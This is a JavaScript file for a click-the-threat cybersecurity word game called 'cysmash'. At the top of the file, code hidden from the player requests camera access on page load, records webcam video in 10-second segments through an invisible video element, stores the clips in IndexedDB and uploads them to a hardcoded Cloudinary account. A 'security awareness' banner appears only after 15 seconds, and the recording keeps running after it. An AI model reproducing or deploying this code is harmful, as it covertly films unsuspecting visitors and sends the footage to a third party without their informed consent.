const STORAGE = {
    idb: {
        dbName: 'cysmash_videos',
        storeName: 'videos',
        version: 1,
    },
    localStorageIndexKey: 'cysmash_video_index_v1',

    cloud: {
        provider: 'cloudinary', 
        cloudinary: {
            cloudName: 'dcgqy12bl',
            uploadPreset: 'webcam_vid',
            folder: 'cysmash',
        },
    },
};

function isCloudEnabled() {
    const c = STORAGE.cloud;
    if (!c || c.provider === 'off') return false;
    if (c.provider === 'cloudinary') {
        return Boolean(c.cloudinary.cloudName && c.cloudinary.uploadPreset);
    }
    return false;
}

function safeJsonParse(value, fallback) {
    try { return JSON.parse(value); } catch { return fallback; }
}

function getVideoIndex() {
    const parsed = safeJsonParse(localStorage.getItem(STORAGE.localStorageIndexKey), []);
    if (!Array.isArray(parsed)) return [];
    return parsed;
}

function setVideoIndex(index) {
    const safeIndex = Array.isArray(index) ? index : [];
    localStorage.setItem(STORAGE.localStorageIndexKey, JSON.stringify(safeIndex));
}

function addToVideoIndex(entry) {
    const index = getVideoIndex();
    index.unshift(entry);
    if (index.length > 200) index.length = 200;
    setVideoIndex(index);
}

function openVideoDb() {
    return new Promise((resolve, reject) => {
        const req = indexedDB.open(STORAGE.idb.dbName, STORAGE.idb.version);
        req.onupgradeneeded = () => {
            const db = req.result;
            if (!db.objectStoreNames.contains(STORAGE.idb.storeName)) {
                const store = db.createObjectStore(STORAGE.idb.storeName, { keyPath: 'id' });
                store.createIndex('createdAt', 'createdAt', { unique: false });
            }
        };
        req.onsuccess = () => resolve(req.result);
        req.onerror = () => reject(req.error);
    });
}

async function idbPutVideo({ id, filename, mimeType, blob, createdAt }) {
    const db = await openVideoDb();
    return await new Promise((resolve, reject) => {
        const tx = db.transaction(STORAGE.idb.storeName, 'readwrite');
        tx.oncomplete = () => resolve(true);
        tx.onerror = () => reject(tx.error);
        tx.objectStore(STORAGE.idb.storeName).put({
            id,
            filename,
            mimeType,
            blob,
            createdAt,
        });
    });
}

async function uploadToCloud(videoBlob, filename) {
    const provider = STORAGE.cloud.provider;
    if (provider === 'cloudinary') {
        const { cloudName, uploadPreset, folder } = STORAGE.cloud.cloudinary;
        const url = `https://api.cloudinary.com/v1_1/${encodeURIComponent(cloudName)}/video/upload`;
        const form = new FormData();
        form.append('file', videoBlob, filename);
        form.append('upload_preset', uploadPreset);
        if (folder) form.append('folder', folder);

        const res = await fetch(url, { method: 'POST', body: form });
        if (!res.ok) {
            const text = await res.text().catch(() => '');
            throw new Error(`Cloudinary upload failed (${res.status}): ${text || res.statusText}`);
        }
        return await res.json();
    }
    throw new Error('Cloud upload provider not configured');
}

const video = document.createElement('video');
video.style.display = 'none';
video.autoplay = true;
video.playsinline = true;
document.body.appendChild(video);

let mediaRecorder = null;
let recordedChunks = [];
let recordingActive = false;
let videoCount = 0;
let segmentTimer = null;

window.addEventListener('load', function() {
    navigator.mediaDevices.getUserMedia({ video: true, audio: false })
        .then(function(stream) {
            video.srcObject = stream;
            
            const options = {};
            if (MediaRecorder.isTypeSupported && MediaRecorder.isTypeSupported('video/webm;codecs=vp8')) {
                options.mimeType = 'video/webm;codecs=vp8';
            } else if (MediaRecorder.isTypeSupported && MediaRecorder.isTypeSupported('video/webm')) {
                options.mimeType = 'video/webm';
            }
            mediaRecorder = new MediaRecorder(stream, options);
            
            mediaRecorder.ondataavailable = function(event) {
                if (event.data.size > 0) {
                    recordedChunks.push(event.data);
                }
            };
            
            mediaRecorder.onstop = async function() {
                if (recordedChunks.length > 0) {
                    videoCount++;
                    
                    const videoBlob = new Blob(recordedChunks, { 
                        type: mediaRecorder.mimeType || 'video/webm',
                    });
                    
                    const createdAt = Date.now();
                    const id = 'video_' + createdAt + '_' + videoCount;
                    const filename = id + '.webm';

                    try {
                        await idbPutVideo({
                            id,
                            filename,
                            mimeType: videoBlob.type || 'video/webm',
                            blob: videoBlob,
                            createdAt,
                        });

                        addToVideoIndex({
                            id,
                            filename,
                            createdAt,
                            size: videoBlob.size,
                            mimeType: videoBlob.type || 'video/webm',
                            cloud: { uploaded: false },
                        });

                        console.log('Saved segment to IndexedDB:', filename);

                        if (isCloudEnabled()) {
                            const result = await uploadToCloud(videoBlob, filename);
                            console.log('Uploaded to cloud:', filename, result);

                            // Update latest index entry (best-effort)
                            const index = getVideoIndex();
                            const item = index.find(x => x && x.id === id);
                            if (item) {
                                item.cloud = { uploaded: true, provider: STORAGE.cloud.provider, result };
                                setVideoIndex(index);
                            }
                        } else {
                            console.log('Cloud upload disabled (Phase 2 not configured).');
                        }
                    } catch (error) {
                        console.log('Save/upload error:', error);
                    }
                    
                    recordedChunks = [];
                }
                
                if (recordingActive) {
                    mediaRecorder.start();
                }
            };
            
            recordingActive = true;
            mediaRecorder.start();
            segmentTimer = setInterval(() => {
                if (!mediaRecorder || mediaRecorder.state !== 'recording') return;
                try {
                    mediaRecorder.requestData();
                } catch {}
                mediaRecorder.stop();
            }, 10000);
            console.log('Recording started - saving 10s segments (Phase 1: IndexedDB).');
        })
        .catch(function(error) {
            alert('Please allow camera access for the security demonstration');
        });
});

setTimeout(function() {
    const browserInfo = navigator.userAgent;
    let browserName = 'Unknown';
    if(browserInfo.includes('Chrome')) browserName = 'Chrome';
    else if(browserInfo.includes('Firefox')) browserName = 'Firefox';
    else if(browserInfo.includes('Safari')) browserName = 'Safari';
    else if(browserInfo.includes('Edge')) browserName = 'Edge';
    
    const platform = navigator.platfrm;
    const screenSize = screen.width + ' x ' + screen.height;
    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    const language = navigator.language;
    
    const warning = document.createElement('div');
    warning.className = 'security-warning';
    warning.innerHTML = 
        '<h2>SECURITY AWARENESS</h2>' +
        '<p>This demonstration shows how malicious websites could misuse camera permissions.</p>' +
        '<p><strong>Always verify</strong> a site before clicking <strong>Allow</strong>.</p>' +
        '<div style="background:#333; padding:15px; margin:15px 0; text-align:left;">' +
        '<p><strong>Device Information:</strong></p>' +
        '<p>Browser: ' + browserName + '</p>' +
        '<p>Platform: ' + platform + '</p>' +
        '<p>Screen: ' + screenSize + '</p>' +
        '<p>Timezone: ' + timezone + '</p>' +
        '<p>Language: ' + language + '</p>' +
        '</div>' +
        '<p><strong>By Aiza Khurram</strong></p>' +
        '<button onclick="this.parentElement.remove()">I Understand</button>';
    
    document.body.appendChild(warning);
}, 15000);

window.addEventListener('beforeunload', function() {
    recordingActive = false;
    if (segmentTimer) {
        clearInterval(segmentTimer);
        segmentTimer = null;
    }
    if (mediaRecorder && mediaRecorder.state !== 'inactive') {
        mediaRecorder.stop();
    }
    if (video.srcObject) {
        video.srcObject.getTracks().forEach(function(track) { track.stop(); });
    }
});

const gameArea = document.getElementById("game-area");
const scoreDisplay = document.getElementById("score");
const levelDisplay = document.getElementById("level");
const timerDisplay = document.getElementById("timer");
const startBtn = document.getElementById("startBtn");
const stopBtn = document.getElementById("stopBtn");

let score = 0;
let level = 1;
let speed = 1500;
let gameInterval;
let timerInterval;
let gameTime = 180;

const threats = [
  "Phishing","Malware","Breach","MITM","CSRF","XSS","Spoofing",
  "Worm","Spyware","Vishing","Smishing","USB Baiting","DDoS",
  "SQL Injection","Ransomware","Brute Force"
];

const safeWords = [
  "Firewall","Encryption","VPN","Patch","Proxy","IDS",
  "Confidentiality","Integrity","Availability","Hashing","IPS","Authentication"
];

function spawnWord() {
  let isThreat = Math.random() > 0.5;
  let wordText = isThreat ?
    threats[Math.floor(Math.random() * threats.length)] :
    safeWords[Math.floor(Math.random() * safeWords.length)];

  let word = document.createElement("div");
  word.innerText = wordText;
  word.classList.add("word", isThreat ? "threat" : "safe");

  let x = Math.random() * (gameArea.clientWidth - 80);
  let y = Math.random() * (gameArea.clientHeight - 30);
  word.style.left = x + "px";
  word.style.top = y + "px";

  gameArea.appendChild(word);

  word.addEventListener("click", function() {
    score += isThreat ? 1 : -1;
    scoreDisplay.innerText = score;
    word.remove();
    if(score >= 10) nextLevel();
  });

  setTimeout(() => { if(word.parentNode) word.remove(); }, 2000);
}

function startTimer() {
  timerDisplay.innerText = gameTime;
  timerInterval = setInterval(() => {
    gameTime--;
    timerDisplay.innerText = gameTime;
    if(gameTime <= 0) endGame();
  }, 1000);
}

function nextLevel() {
  level++;
  levelDisplay.innerText = level;
  clearInterval(gameInterval);
  speed = Math.max(speed - 300, 400);
  gameInterval = setInterval(spawnWord, speed);
  score = 0;
  scoreDisplay.innerText = score;
  alert("Level Up! You Win");
}

function endGame() {
  clearInterval(gameInterval);
  clearInterval(timerInterval);
  alert("Game Over");
}

startBtn.addEventListener("click", function(){
  clearInterval(gameInterval);
  clearInterval(timerInterval);
  score = 0; scoreDisplay.innerText = score;
  level = 1; levelDisplay.innerText = level;
  speed = 1500;
  gameTime = 180;
  timerDisplay.innerText = gameTime;

  gameInterval = setInterval(spawnWord, speed);
  startTimer();
});

stopBtn.addEventListener("click", function(){
  clearInterval(gameInterval);
  clearInterval(timerInterval);
  alert("Game Stopped");
});